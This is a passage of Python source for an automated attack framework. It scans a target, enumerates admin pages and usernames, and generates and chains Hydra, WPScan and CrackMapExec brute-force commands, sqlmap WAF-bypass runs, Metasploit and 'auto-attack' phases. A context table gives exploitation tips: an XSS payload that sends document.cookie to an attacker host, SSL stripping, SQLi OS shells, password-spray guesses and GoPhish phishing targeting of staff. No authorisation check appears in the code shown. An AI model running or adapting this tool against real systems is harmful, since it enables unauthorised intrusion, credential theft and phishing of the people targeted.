                    f"hydra -L /usr/share/wordlists/dirb/others/names.txt -P /usr/share/wordlists/dirb/others/best15.txt {_domain(target)} http-post-form '{path}:username=^USER^&password=^PASS^:invalid'",
                    "high", "brute_force",
                    context=f"Gobuster discovered a login/admin page at {path}. This attack uses Hydra to test common username and password combinations against the login form.",
                    look_for="Look for lines with '[80][http-post-form]' followed by 'login:' and 'password:' — these are confirmed credential pairs."))
            if any(p in path.lower() for p in ["/backup","/.git","/.env","/config","/.svn","/db","/database","/dump",".sql",".bak"]):
                F.append(_finding("critical", f"Sensitive: {path}", f"HTTP {code}", module="Gobuster"))
                A.append(_attack(f"Download {path}", "Potentially sensitive file",
                    f"curl -sk {url}{path}", "critical", "info_disclosure",
                    context=f"A sensitive path '{path}' was discovered. This may contain config files, database backups, source code, or credentials.",
                    look_for="Examine the content for passwords, API keys, database connection strings, or internal configuration data."))
    # Also look for gobuster's alternate output format
    for match in re.findall(r'(https?://\S+)\s+\(Status:\s*(\d+)', out):
        found_url, code = match[0], int(match[1])
        path = urllib.parse.urlparse(found_url).path
        if code == 200 and path not in ("/",):
            F.append(_finding("info", f"URL: {path} [{code}]", found_url, module="Gobuster"))
    return {"raw_output": out[:5000], "findings": F, "attacks": A}


def mod_wpscan(target, tt):
    """WordPress vulnerability scanning and user enumeration."""
    if not _tool("wpscan"):
        return {"raw_output": "wpscan not installed", "findings": [], "attacks": [], "skipped": True}
    url = _url(target)
    F, A = [], []
    # Quick check if target is WordPress
    is_wp = False
    if requests:
        try:
            r = requests.get(url, timeout=8, verify=False)
            if any(sig in r.text for sig in ["/wp-content/","/wp-includes/","wp-login"]):
                is_wp = True
        except Exception:
            pass
        if not is_wp:
            try:
                r2 = requests.get(f"{url}/wp-login.php", timeout=5, verify=False)
                if r2.status_code == 200 and "wp-login" in r2.text.lower():
                    is_wp = True
            except Exception:
                pass
    if not is_wp:
        return {"raw_output": "Not a WordPress site — skipping WPScan", "findings": [], "attacks": []}

    s,e,_ = _run(f"wpscan --url {url} --enumerate u,vp,vt --no-banner --random-user-agent --disable-tls-checks 2>&1 | head -200", 300)
    out = s + e
    F.append(_finding("info", "WordPress detected", "WPScan ran full enumeration", module="WPScan"))

    # Extract users
    wp_users = []
    for user_match in re.findall(r'\[.\]\s+(\S+)', out):
        # WPScan user output patterns
        pass
    for m in re.finditer(r'(?:identified|found|login|user(?:name)?)\s*[:=]?\s*(\w{2,20})', out, re.I):
        u = m.group(1).lower()
        if u not in ("the","this","that","with","from","was","are","been","has","have","not","for","and","but",
                      "all","can","had","her","one","our","out","you","http","https","true","false","null","none") and u not in wp_users:
            wp_users.append(u)

    # Parse WPScan's user table format: | username |
    for m in re.findall(r'\|\s+([a-zA-Z][\w.-]{1,19})\s+\|', out):
        if m.lower() not in wp_users:
            wp_users.append(m.lower())

    for u in wp_users:
        F.append(_finding("high", f"WP User: {u}", "Enumerated by WPScan", module="WPScan"))

    # Extract vulnerabilities
    for vuln in re.findall(r'Title:\s*(.+)', out):
        F.append(_finding("high", f"WP Vuln: {vuln.strip()}", "Detected by WPScan", module="WPScan"))
    for cve in set(re.findall(r'(CVE-\d{4}-\d+)', out)):
        F.append(_finding("critical", f"CVE: {cve}", "Found in WordPress component", module="WPScan"))
        A.append(_attack(f"Exploit {cve}", "WordPress CVE", f"searchsploit {cve}", "critical", "exploitation",
            context=f"WPScan found {cve} in a WordPress component. Searchsploit searches for publicly available exploit code for this vulnerability.",
            look_for="Look for exploit entries — note the path and EDB-ID. Use 'searchsploit -m ID' to download the exploit code."))

    # Plugin/theme vulns
    if "outdated" in out.lower() or "insecure" in out.lower():
        F.append(_finding("medium", "Outdated WP components", "Update plugins/themes", module="WPScan"))

    if wp_users:
        user_list = ",".join(wp_users[:10])
        A.append(_attack("WP password brute force", f"Users: {', '.join(wp_users[:5])}",
            f"wpscan --url {url} -U {user_list} -P /usr/share/wordlists/rockyou.txt --max-threads 5 --password-attack wp-login",
            "high", "brute_force",
            context=f"Found {len(wp_users)} WordPress user(s): {', '.join(wp_users[:5])}. This brute forces passwords using the rockyou wordlist against the WordPress login.",
            look_for="Look for 'Valid Combinations Found' section. Successful logins show as 'Username: xxx, Password: xxx' — these are confirmed admin credentials."))

    return {"raw_output": out[:5000], "findings": F, "attacks": A}


def mod_wafw00f(target, tt):
    """WAF (Web Application Firewall) detection."""
    if not _tool("wafw00f"):
        return {"raw_output": "wafw00f not installed", "findings": [], "attacks": [], "skipped": True}
    url = _url(target)
    F, A = [], []
    s,e,_ = _run(f"wafw00f {url} -a 2>&1", 60)
    out = s + e
    wafs = re.findall(r'is behind\s+(.+?)(?:\s+WAF)?$', out, re.M|re.I)
    if wafs:
        for w in wafs:
            F.append(_finding("info", f"WAF detected: {w.strip()}", "May block attack payloads", module="WAF"))
        A.append(_attack("WAF bypass testing", f"WAF: {', '.join(w.strip() for w in wafs)}",
            f"sqlmap -u '{url}/?id=1' --tamper=between,randomcase,space2comment --batch",
            "medium", "evasion",
            context=f"A WAF ({', '.join(w.strip() for w in wafs)}) is protecting this target. SQLMap tamper scripts attempt to encode payloads to bypass WAF rules.",
            look_for="If SQLMap reports 'injectable' despite the WAF, the bypass works. If blocked, try different tamper scripts: charencode, apostrophemask, percentage."))
    elif "no waf" in out.lower() or "not behind" in out.lower():
        F.append(_finding("info", "No WAF detected", "Target is unprotected by WAF", module="WAF"))
    return {"raw_output": out[:3000], "findings": F, "attacks": A}


def mod_admin_enum(target, tt):
    """Find admin/login pages and enumerate usernames."""
    if not requests:
        return {"raw_output": "requests unavailable", "findings": [], "attacks": []}
    url = _url(target)
    domain = _domain(target)
    F, A, out = [], [], []

    # Phase 1: Discover login/admin pages
    admin_paths = [
        "/admin", "/administrator", "/admin/login", "/admin.php",
        "/wp-admin", "/wp-login.php", "/user/login", "/login", "/login.php",
        "/cpanel", "/phpmyadmin", "/manager", "/dashboard", "/panel",
        "/auth/login", "/accounts/login", "/signin", "/portal", "/admin/index.php",
        "/webadmin", "/siteadmin", "/moderator", "/controlpanel",
        "/wp-admin/admin-ajax.php", "/admin/dashboard", "/backoffice",
    ]
    found_logins = []
    for path in admin_paths:
        try:
            r = requests.get(f"{url}{path}", timeout=4, verify=False, allow_redirects=True)
            if r.status_code == 200 and len(r.text) > 200:
                has_form = any(kw in r.text.lower() for kw in ["password","login","sign in","log in","username","passwd","<form"])
                if has_form:
                    F.append(_finding("high", f"Login page: {path}", f"HTTP {r.status_code}", module="AdminEnum"))
                    found_logins.append((path, r.text))
                    out.append(f"[+] Login found: {path}")
        except Exception:
            pass

    # Phase 2: WordPress REST API user enumeration
    wp_users = []
    try:
        r = requests.get(f"{url}/wp-json/wp/v2/users", timeout=8, verify=False)
        if r.status_code == 200:
            try:
                users_data = r.json()
                for u in users_data:
                    name = u.get("slug") or u.get("name","")
                    if name and name not in wp_users:
                        wp_users.append(name)
                        F.append(_finding("high", f"Username: {name}", "Enumerated via WP REST API (/wp-json/wp/v2/users)", module="AdminEnum"))
                        out.append(f"[+] WordPress user (REST API): {name}")
            except Exception:
                pass
    except Exception:
        pass

    # Phase 3: WordPress author enumeration (?author=N)
    for i in range(1, 11):
        try:
            r = requests.get(f"{url}/?author={i}", timeout=4, verify=False, allow_redirects=True)
            m = re.search(r'/author/([^/]+)/', r.url)
            if m:
                uname = m.group(1)
                if uname not in wp_users:
                    wp_users.append(uname)
                    F.append(_finding("high", f"Username: {uname}", f"Enumerated via ?author={i}", module="AdminEnum"))
                    out.append(f"[+] WordPress user (author={i}): {uname}")
            elif r.status_code == 200:
                tm = re.search(r'<title>\s*(.+?)\s*[|<]', r.text)
                if tm and tm.group(1).strip() and len(tm.group(1).strip()) < 30:
                    possible_name = tm.group(1).strip().lower().replace(" ","-")
                    if possible_name and possible_name not in wp_users and "/" not in possible_name:
                        wp_users.append(possible_name)
                        out.append(f"[?] Possible user from title: {possible_name}")
        except Exception:
            pass

    # Phase 4: Username enumeration via login form response differencing
    enum_users = []
    for login_path, html in found_logins[:2]:
        try:
            form_action = re.search(r'<form[^>]*action=["\']([^"\']*)["\']', html, re.I)
            action_url = form_action.group(1) if form_action else login_path
            if not action_url.startswith("http"):
                action_url = f"{url}{action_url}" if action_url.startswith("/") else f"{url}/{action_url}"

            inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\']', html, re.I)
            user_field = next((i for i in inputs if any(u in i.lower() for u in ["user","login","email","name","usr","account"])), None)
            pass_field = next((i for i in inputs if any(p in i.lower() for p in ["pass","pwd","secret","pw"])), None)

            if not user_field or not pass_field:
                continue

            # Baseline: test a definitely-nonexistent user
            baseline = requests.post(action_url, data={user_field: "zzz_no_user_exists_zzz_42", pass_field: "wrongpass123!"},
                                     timeout=6, verify=False, allow_redirects=False)
            baseline_len = len(baseline.text)
            baseline_code = baseline.status_code

            common_users = ["admin","administrator","root","user","test","guest","info",
                            "webmaster","support","manager","demo","operator","sysadmin","superadmin"]
            for uname in common_users:
                try:
                    r2 = requests.post(action_url, data={user_field: uname, pass_field: "wrongpass123!"},
                                       timeout=6, verify=False, allow_redirects=False)
                    diff = abs(len(r2.text) - baseline_len)
                    if diff > 30 or r2.status_code != baseline_code:
                        if uname not in enum_users:
                            enum_users.append(uname)
                            F.append(_finding("high", f"Valid username: {uname}",
                                f"Login form at {login_path} responds differently for this user (response diff: {diff} chars)",
                                module="AdminEnum"))
                            out.append(f"[+] Valid username (form enum): {uname} at {login_path} (diff={diff})")
                except Exception:
                    pass
        except Exception:
            pass

    # Generate attacks from findings
    all_users = list(dict.fromkeys(wp_users + enum_users))  # dedupe, preserve order
    if all_users:
        user_str = ",".join(all_users[:15])
        if wp_users:
            A.append(_attack("WP user brute force", f"Users: {', '.join(all_users[:5])}",
                f"wpscan --url {url} -U {user_str} -P /usr/share/wordlists/rockyou.txt --max-threads 5",
                "high", "brute_force",
                context=f"Enumerated {len(all_users)} username(s): {', '.join(all_users[:5])}. This brute forces WordPress login with the rockyou wordlist.",
                look_for="Look for 'Valid Combinations Found' — each entry shows Username and Password. These are confirmed admin credentials for the WordPress site."))
        for path, _ in found_logins[:2]:
            A.append(_attack(f"Login brute force ({path})", f"Users: {', '.join(all_users[:3])}",
                f"hydra -L /tmp/users.txt -P /usr/share/wordlists/rockyou.txt {domain} http-post-form '{path}:username=^USER^&password=^PASS^:invalid' -t 4",
                "high", "brute_force",
                context=f"Enumerated usernames ({', '.join(all_users[:3])}) will be tested against the login form at {path} using common passwords.",
                look_for="Look for '[80][http-post-form]' lines with 'login:' and 'password:' entries. Each is a confirmed credential pair for the admin panel."))

    if found_logins and not all_users:
        for path, _ in found_logins[:2]:
            A.append(_attack(f"Login brute force ({path})", f"Admin panel at {path}",
                f"hydra -L /usr/share/wordlists/dirb/others/names.txt -P /usr/share/wordlists/dirb/others/best15.txt {domain} http-post-form '{path}:username=^USER^&password=^PASS^:invalid' -t 4",
                "high", "brute_force",
                context=f"A login form was found at {path}. No usernames were enumerated, so this uses a common username list against the form.",
                look_for="Look for '[80][http-post-form]' lines with successful logins showing 'login:' and 'password:' values."))

    return {"raw_output": "\n".join(out) if out else "No admin pages or usernames found", "findings": F, "attacks": A}


def mod_masscan(target, tt):
    """Ultra-fast port scanner (complements nmap)."""
    if not _tool("masscan"):
        return {"raw_output": "masscan not installed", "findings": [], "attacks": [], "skipped": True}
    host = _domain(target) if tt in ("domain","url") else target
    F, A = [], []
    s,e,_ = _run(f"masscan {host} -p1-10000 --rate=1000 --wait 3 2>&1 | head -100", 120)
    out = s + e
    ports_found = []
    for port_s, proto in re.findall(r'port\s+(\d+)/(tcp|udp)', out):
        port = int(port_s)
        ports_found.append(port)
        F.append(_finding("info", f"Port {port}/{proto} open", "Masscan fast discovery", module="Masscan"))
    if ports_found:
        port_list = ",".join(str(p) for p in sorted(ports_found)[:50])
        A.append(_attack("Deep scan open ports", f"{len(ports_found)} ports found",
            f"nmap -sV -sC -p {port_list} {host}",
            "medium", "recon",
            context=f"Masscan quickly found {len(ports_found)} open port(s). This nmap command does deep service version detection and script scanning on each discovered port.",
            look_for="Look for service names and versions next to each port. Check for outdated software versions which may have known CVEs."))
    return {"raw_output": out[:3000], "findings": F, "attacks": A}


def mod_enum4linux(target, tt):
    """SMB/Windows enumeration — users, shares, groups, password policy."""
    if not _tool("enum4linux"):
        return {"raw_output": "enum4linux not installed", "findings": [], "attacks": [], "skipped": True}
    host = _domain(target) if tt in ("domain","url") else target
    F, A = [], []
    # Only run if port 445 or 139 likely open
    smb_open = False
    for port in (445, 139):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            if s.connect_ex((host, port)) == 0:
                smb_open = True
            s.close()
        except Exception:
            pass
    if not smb_open:
        return {"raw_output": "SMB ports (445/139) not open — skipping", "findings": [], "attacks": []}

    s,e,_ = _run(f"enum4linux -a {host} 2>&1 | head -200", 180)
    out = s + e

    # Extract users
    smb_users = []
    for m in re.finditer(r'user:\[([^\]]+)\]', out, re.I):
        u = m.group(1)
        if u not in smb_users:
            smb_users.append(u)
            F.append(_finding("high", f"SMB User: {u}", "Enumerated via enum4linux", module="Enum4Linux"))

    # Extract shares
    for m in re.finditer(r'(\S+)\s+Disk\s', out):
        share = m.group(1)
        F.append(_finding("medium", f"SMB Share: {share}", "Network file share", module="Enum4Linux"))

    # Password policy
    if "minimum password length" in out.lower():
        pm = re.search(r'minimum password length\s*=\s*(\d+)', out, re.I)
        if pm:
            F.append(_finding("info", f"Min password length: {pm.group(1)}", "SMB password policy", module="Enum4Linux"))
            if int(pm.group(1)) < 8:
                F.append(_finding("medium", "Weak password policy", f"Min length only {pm.group(1)} chars", module="Enum4Linux"))

    if "account lockout threshold" in out.lower():
        lt = re.search(r'account lockout threshold\s*=\s*(\d+)', out, re.I)
        if lt and int(lt.group(1)) == 0:
            F.append(_finding("medium", "No account lockout", "Brute force is feasible", module="Enum4Linux"))
            if smb_users:
                A.append(_attack("SMB password spray", f"Users: {', '.join(smb_users[:5])}",
                    f"hydra -L /tmp/smb_users.txt -P /usr/share/wordlists/dirb/others/best15.txt smb://{host}",
                    "high", "brute_force",
                    context=f"Found {len(smb_users)} user(s) with no account lockout policy. Hydra will test common passwords against each user via SMB.",
                    look_for="Look for '[445][smb]' lines with 'login:' and 'password:' entries. Successful SMB credentials may give access to file shares or domain resources."))

    if smb_users:
        A.append(_attack("SMB user password attack", f"{len(smb_users)} users found",
            f"crackmapexec smb {host} -u /tmp/smb_users.txt -p /usr/share/wordlists/dirb/others/best15.txt",
            "high", "brute_force",
            context=f"Enum4linux found {len(smb_users)} user account(s). CrackMapExec tests credential combos efficiently against SMB.",
            look_for="Lines marked with [+] and showing 'Pwn3d!' indicate admin-level credentials. Lines with valid credentials show the username and password."))

    return {"raw_output": out[:5000], "findings": F, "attacks": A}



def mod_theharvester(target, tt):
    """Email, host, and subdomain harvesting from OSINT sources."""
    found_cmd = None
    for name in ("theHarvester","theharvester"):
        if _tool(name):
            found_cmd = name
            break
    if not found_cmd:
        return {"raw_output": "theHarvester not installed", "findings": [], "attacks": [], "skipped": True}
    domain = _domain(target)
    F, A = [], []
    s,e,_ = _run(f"{found_cmd} -d {domain} -l 200 -b all 2>&1 | tail -80", 180)
    out = s + e

    # Extract emails
    emails = set(re.findall(r'[\w.+-]+@[\w.-]+\.\w+', out))
    for em in emails:
        F.append(_finding("info", f"Email: {em}", "Harvested from OSINT sources", module="Harvester"))

    # Extract hosts/IPs
    hosts = set(re.findall(r'(\d+\.\d+\.\d+\.\d+)', out))
    for h in hosts:
        F.append(_finding("info", f"Host IP: {h}", "Found by theHarvester", module="Harvester"))

    # Extract subdomains
    subs = set(re.findall(r'([a-zA-Z0-9][\w.-]*\.' + re.escape(domain) + r')', out))
    for sub in sorted(subs):
        F.append(_finding("info", f"Subdomain: {sub}", "Harvested", module="Harvester"))

    if emails:
        A.append(_attack("Targeted phishing", f"{len(emails)} emails found",
            f"Use GoPhish with harvested emails from {domain}",
            "medium", "social_engineering",
            context=f"theHarvester found {len(emails)} email address(es) associated with {domain}. These can be used for targeted phishing or password spraying.",
            look_for="Each email is a potential target. Cross-reference with LinkedIn for role-based targeting. Senior staff and IT admins are high-value targets."))

    return {"raw_output": out[:4000], "findings": F, "attacks": A}


# ══════════════════════════════════════════════════════════════════════════════
# Attack Context Enrichment — adds explanation to attacks from existing modules
# ══════════════════════════════════════════════════════════════════════════════

ATTACK_CONTEXT = {
    "Email Spoofing": {
        "context": "SPF uses soft fail (~all) which allows forged emails from this domain. An attacker can send emails impersonating the organization.",
        "look_for": "Test by sending a spoofed email to yourself. With SPF soft fail, emails often land in spam but are still delivered to the target."
    },
    "Email Spoofing (no DMARC)": {
        "context": "No DMARC record exists — anyone can send emails appearing to be from this domain. This is the #1 enabler of phishing attacks.",
        "look_for": "Configure GoPhish or SET with the target domain. Without DMARC enforcement, spoofed emails reach the inbox more reliably."
    },
    "Exploit old server": {
        "context": "The web server runs an outdated version with known CVEs. Searchsploit searches the Exploit-DB archive for public exploit code.",
        "look_for": "Look for 'Remote Code Execution' or 'File Read' exploits. Note the EDB-ID — download with 'searchsploit -m EDB_ID'."
    },
    "Clickjacking": {
        "context": "No X-Frame-Options or CSP frame-ancestors header — the page can be embedded in an iframe for clickjacking attacks.",
        "look_for": "If the page loads inside the iframe, it's vulnerable. Victims can be tricked into clicking hidden buttons overlaid on the framed page."
    },
    "SSL Stripping": {
        "context": "No HSTS header means browsers don't enforce HTTPS. On the same network, an attacker can downgrade connections to HTTP and intercept traffic.",
        "look_for": "With sslstrip or bettercap on the same network, you'll see plaintext HTTP traffic including login credentials and session tokens."
    },
    "Cookie theft via XSS": {
        "context": "Session cookies lack HttpOnly — JavaScript can read them. Any XSS vulnerability can steal user sessions by exfiltrating document.cookie.",
        "look_for": "If you find an XSS point, inject: <script>fetch('http://YOUR_IP/'+document.cookie)</script> — check your listener for the session cookie."
    },
    "WPScan": {
        "context": "WordPress CMS detected. WPScan enumerates plugins, themes, and users, checking each for known vulnerabilities.",
        "look_for": "Look for [!] (vulnerability warnings), [+] (users found), and red-highlighted CVEs. Outdated plugins are the most common attack vector."
    },
    "FTP anonymous login": {
        "context": "Tests if FTP allows login without credentials. Anonymous FTP often exposes sensitive files, backups, or writable directories.",
        "look_for": "If '230 Login successful' appears, you're in. Run 'ls -la' and 'cd' to browse. Look for config files, backups, and source code."
    },
    "FTP brute force": {
        "context": "Hydra tests username/password combinations against FTP. Successful login can give read/write access to server files.",
        "look_for": "Lines with '[21][ftp]' show attempts. Successful: 'host: X  login: USER  password: PASS' — these are working FTP credentials."
    },
    "SSH brute force": {
        "context": "Hydra tests credentials against SSH. Successful login gives full remote shell access to the server.",
        "look_for": "Lines with '[22][ssh]' followed by 'login:' and 'password:' are confirmed credentials. Each one gives remote terminal access."
    },
    "Exploit old SSH": {
        "context": "Outdated OpenSSH with known vulnerabilities. Searchsploit finds public exploits for this version.",
        "look_for": "Look for 'Remote' exploits — these work without credentials. Download with 'searchsploit -m EDB_ID'."
    },
    "MySQL brute force": {
        "context": "MySQL is exposed to the network. Hydra tests common credentials. Successful login exposes all database contents.",
        "look_for": "Lines with '[3306][mysql]' show results. Success: 'login: USER  password: PASS' — use 'mysql -h HOST -u USER -p' to connect."
    },
    "PostgreSQL brute force": {
        "context": "PostgreSQL is directly accessible. Hydra tests credentials. PostgreSQL can also execute OS commands via COPY TO/FROM PROGRAM.",
        "look_for": "Look for '[5432][postgres]' success lines. PostgreSQL access can escalate to OS command execution."
    },
    "BlueKeep check": {
        "context": "Scans for CVE-2019-0708 (BlueKeep) — a critical unauthenticated RCE in Remote Desktop (RDP).",
        "look_for": "Look for 'VULNERABLE' in the output. If found, the target can be fully compromised without credentials via RDP."
    },
    "EternalBlue check": {
        "context": "Scans for MS17-010 (EternalBlue) in SMB — the vulnerability behind WannaCry ransomware. Allows unauthenticated remote code execution.",
        "look_for": "Look for 'VULNERABLE' in the nmap script output. This is a critical finding — full remote code execution without any credentials."
    },
    "SMB enum shares": {
        "context": "Lists SMB network shares without credentials. Exposed shares may contain sensitive documents, configs, or writable directories.",
        "look_for": "Look for share names and access levels. Shares marked 'READ' or with no password are directly browsable. ADMIN$ and C$ indicate admin access."
    },
    "Redis unauth access": {
        "context": "Redis is exposed and likely has no authentication. Unauthenticated Redis can read/write data and potentially write SSH keys for shell access.",
        "look_for": "If you get a Redis prompt, run: INFO (server details), KEYS * (list data), CONFIG GET dir (check filesystem access)."
    },
    "MongoDB unauth access": {
        "context": "MongoDB is exposed and may have no auth enabled. Unauthenticated access allows dumping all databases and collections.",
        "look_for": "Run 'show dbs', then 'use DBNAME' and 'db.getCollectionNames()'. Look for user tables with credentials."
    },
    "SQLi dump database": {
        "context": "SQL injection was confirmed. This dumps all database contents — tables, columns, and data including credentials.",
        "look_for": "SQLMap shows tables as they're dumped. Focus on 'users', 'accounts', 'admin' tables. Password hashes can be cracked with hashcat."
    },
    "SQLi OS shell": {
        "context": "Escalates SQL injection to operating system command execution. If the DB user has FILE privileges, this provides a system shell.",
        "look_for": "If 'os-shell>' appears, you have command execution. Run 'id' and 'whoami' to check privilege level."
    },
    "XSS exploitation": {
        "context": "XSStrike confirmed XSS vulnerability. Cross-site scripting enables session hijacking, keylogging, and phishing via injected JavaScript.",
        "look_for": "Look for payloads marked 'Vulnerable'. Test in browser. Use the payload for session stealing: fetch('http://ATTACKER/'+document.cookie)."
    },
    "Command injection -> shell": {
        "context": "Commix confirmed OS command injection. Arbitrary system commands can be executed on the server — effectively full server compromise.",
        "look_for": "The 'id' output shows the server user. 'uid=0(root)' means root access. Otherwise, note the user for privilege escalation."
    },
    "Social engineering recon": {
        "context": "Sherlock found social media accounts for this username. These profiles provide intelligence for targeted social engineering attacks.",
        "look_for": "Review profiles for personal info: full name, employer, location, interests. This data crafts convincing phishing pretexts."
    },
    "Phishing campaign": {
        "context": "Gathered email intelligence enables targeted phishing. GoPhish tracks email opens, link clicks, and credential submissions.",
        "look_for": "In GoPhish dashboard, monitor: email opens (tracking pixel), link clicks, and submitted credentials from the phishing page."
    },
    "Password spray": {
        "context": "Tests a few common passwords across many accounts. Avoids lockouts while finding weak/default passwords across the organization.",
        "look_for": "Successful logins indicate weak passwords. Try: 'Password1!', 'Company2024!', 'Welcome1!', and seasonal variations."
    },
    "POODLE": {
        "context": "SSLv3 is enabled — vulnerable to POODLE (Padding Oracle On Downgraded Legacy Encryption). Can decrypt encrypted traffic.",
        "look_for": "If successful, decrypted bytes from the SSL session appear. This reveals session cookies, credentials, and sensitive data."
    },
    "Subdomain takeover check": {
        "context": "Checks subdomains for dangling CNAME records pointing to unclaimed cloud services. A takeover lets you host content on the victim's subdomain.",
        "look_for": "Check each CNAME target. If pointing to GitHub Pages, Heroku, AWS S3, etc. that returns 404 — the subdomain is likely takeover-able."
    },
    "Browse exposed dirs": {
        "context": "Directory listing is enabled — the server shows all files in the directory. This exposes the file structure and all contents.",
        "look_for": "Look for: backup files (.tar.gz, .zip, .sql), config files (.conf, .env, .ini), source code, database dumps, and credentials."
    },
    "Admin brute force": {
        "context": "An admin panel was discovered with a login form. Hydra systematically tests username/password combinations.",
        "look_for": "Look for '[http-post-form]' lines with 'login:' and 'password:' values — these are working admin credentials."
    },
}

def _enrich_attacks(attacks):
    """Add context and look_for to attacks that don't have them."""
    for a in attacks:
        if not a.get("context") and a["name"] in ATTACK_CONTEXT:
            a["context"] = ATTACK_CONTEXT[a["name"]].get("context", "")
            a["look_for"] = ATTACK_CONTEXT[a["name"]].get("look_for", "")
        # Fallback: generate basic context from category
        if not a.get("context"):
            cat_context = {
                "brute_force": f"This attack tests credential combinations against the target service. Hydra or similar tools systematically try username/password pairs.",
                "exploitation": f"This attempts to exploit a known vulnerability in the target. Success may grant remote access or data exposure.",
                "recon": f"This gathers additional intelligence about the target's infrastructure, services, or configuration.",
                "injection": f"This exploits an injection vulnerability to execute unauthorized commands or queries on the target.",
                "social_engineering": f"This leverages gathered intelligence to craft social engineering attacks against the target's users.",
                "client_side": f"This exploits a client-side vulnerability that affects users who visit or interact with the target.",
                "network": f"This exploits a network-level vulnerability, typically requiring proximity or MITM position on the target's network.",
                "info_disclosure": f"This accesses exposed sensitive information that should not be publicly accessible.",
                "access": f"This attempts to gain unauthorized access to an exposed service using default or no credentials.",
                "evasion": f"This attempts to bypass security controls (WAF, IDS) protecting the target.",
            }
            a["context"] = cat_context.get(a.get("category",""), "Executes the specified command against the target.")
            a["look_for"] = a.get("look_for", "Review the command output for successful results, error messages, and any sensitive data revealed.")


# ══════════════════════════════════════════════════════════════════════════════
# Module Registry
# ══════════════════════════════════════════════════════════════════════════════

MODULES = [
    # ── Recon phase ──
    {"id":"dns",          "name":"DNS & WHOIS Recon",        "fn":mod_dns,          "types":["domain","url"],             "phase":"recon"},
    {"id":"headers",      "name":"HTTP Security Headers",    "fn":mod_headers,      "types":["domain","url"],             "phase":"recon"},
    {"id":"ssl",          "name":"SSL/TLS Analysis",         "fn":mod_ssl,          "types":["domain","url"],             "phase":"recon"},
    {"id":"robots",       "name":"Robots & Sitemap",         "fn":mod_robots,       "types":["domain","url"],             "phase":"recon"},
    {"id":"tech",         "name":"Technology Detection",     "fn":mod_tech,         "types":["domain","url"],             "phase":"recon"},
    {"id":"wafw00f",      "name":"WAF Detection",            "fn":mod_wafw00f,      "types":["domain","url"],             "phase":"recon"},
    {"id":"ports",        "name":"Basic Port Scan",          "fn":mod_ports_basic,  "types":["domain","url","ip"],        "phase":"recon"},
    # ── Scanning phase ──
    {"id":"nmap",         "name":"NMAP Service Scan",        "fn":mod_nmap,         "types":["domain","url","ip"],        "phase":"scanning"},
    {"id":"masscan",      "name":"Masscan Fast Ports",       "fn":mod_masscan,      "types":["domain","url","ip"],        "phase":"scanning"},
    {"id":"nikto",        "name":"Nikto Web Scanner",        "fn":mod_nikto,        "types":["domain","url"],             "phase":"scanning"},
    {"id":"sublist3r",    "name":"Subdomain Enumeration",    "fn":mod_sublist3r,    "types":["domain","url"],             "phase":"scanning"},
    {"id":"harvester",    "name":"theHarvester OSINT",       "fn":mod_theharvester, "types":["domain","url"],             "phase":"scanning"},
    {"id":"dirb",         "name":"Directory Brute Force",    "fn":mod_dirb,         "types":["domain","url"],             "phase":"scanning"},
    {"id":"gobuster",     "name":"Gobuster Dir Scan",        "fn":mod_gobuster,     "types":["domain","url"],             "phase":"scanning"},
    {"id":"wpscan",       "name":"WordPress Scanner",        "fn":mod_wpscan,       "types":["domain","url"],             "phase":"scanning"},
    {"id":"admin_enum",   "name":"Admin & User Enumeration", "fn":mod_admin_enum,   "types":["domain","url"],             "phase":"scanning"},
    {"id":"enum4linux",   "name":"SMB/Windows Enum",         "fn":mod_enum4linux,   "types":["domain","url","ip"],        "phase":"scanning"},
    # ── Exploitation phase ──
    {"id":"sqlmap",       "name":"SQL Injection Scan",       "fn":mod_sqlmap,       "types":["domain","url"],             "phase":"exploitation"},
    {"id":"xsstrike",     "name":"XSS Scanner",              "fn":mod_xsstrike,     "types":["domain","url"],             "phase":"exploitation"},
    {"id":"commix",       "name":"Command Injection Scan",   "fn":mod_commix,       "types":["domain","url"],             "phase":"exploitation"},
    # ── OSINT (non-web targets) ──
    {"id":"sherlock",     "name":"Username OSINT",           "fn":mod_sherlock,     "types":["username"],                 "phase":"recon"},
    {"id":"email",        "name":"Email OSINT",              "fn":mod_email,        "types":["email"],                    "phase":"recon"},
]

# ══════════════════════════════════════════════════════════════════════════════
# Orchestrator — Full Pipeline:
#   1. Recon → 2. Scanning → 3. Exploitation checks
#   4. Metasploit scans → 5. Auto-Attack execution → 6. AI Analysis → 7. Report
# ══════════════════════════════════════════════════════════════════════════════

try:
    import ai_engine
except ImportError:
    ai_engine = None

try:
    import msf_engine
except ImportError:
    msf_engine = None

_scans = {}

def start_scan(target, target_type=None):
    target = target.strip()
    if not target_type:
        target_type = detect_type(target)
    scan_id = uuid.uuid4().hex[:8]
    applicable = [m for m in MODULES if target_type in m["types"]]

    # Estimate total phases for progress tracking
    # Base modules + metasploit phase + auto-attack phase + AI analysis phase
    extra_phases = 3  # metasploit, auto-attack, report

    scan = {
        "id": scan_id,
        "target": target,
        "target_type": target_type,
        "status": "running",
        "phase": "recon",
        "started_at": datetime.now(timezone.utc).isoformat(),
        "completed_at": None,
        "modules": {},
        "findings": [],
        "attacks": [],
        "attack_results": [],
        "msf_results": [],
        "ai_assessment": None,
        "report_html": None,
        "current_attack": None,
        "summary": {"critical":0,"high":0,"medium":0,"low":0,"info":0},
        "progress": {
            "total": len(applicable) + extra_phases,
            "completed": 0,
            "current": "Starting...",
            "phase": "recon",
            "auto_attacks_total": 0,
            "auto_attacks_done": 0,
        },
    }
    for m in applicable:
        scan["modules"][m["id"]] = {
            "name": m["name"], "phase": m["phase"],
            "status": "pending", "raw_output": "", "findings_count": 0,
        }
    _scans[scan_id] = scan
    threading.Thread(target=_execute, args=(scan_id, target, target_type, applicable), daemon=True).start()
    return scan_id


def _execute(scan_id, target, target_type, modules):
    scan = _scans[scan_id]
    host = _domain(target) if target_type in ("domain", "url") else target

    # ── Phase 1-3: Recon → Scanning → Exploitation (existing) ────────────
    for phase in ("recon", "scanning", "exploitation"):
        scan["phase"] = phase
        scan["progress"]["phase"] = phase
        phase_mods = [m for m in modules if m["phase"] == phase]
        if not phase_mods:
            continue
        with ThreadPoolExecutor(max_workers=4) as pool:
            futs = {}
            for m in phase_mods:
                scan["modules"][m["id"]]["status"] = "running"
                scan["progress"]["current"] = m["name"]
                futs[pool.submit(m["fn"], target, target_type)] = m
            for fut in as_completed(futs):
                m = futs[fut]
                try:
                    res = fut.result()
                    if res.get("skipped"):
                        scan["modules"][m["id"]]["status"] = "skipped"
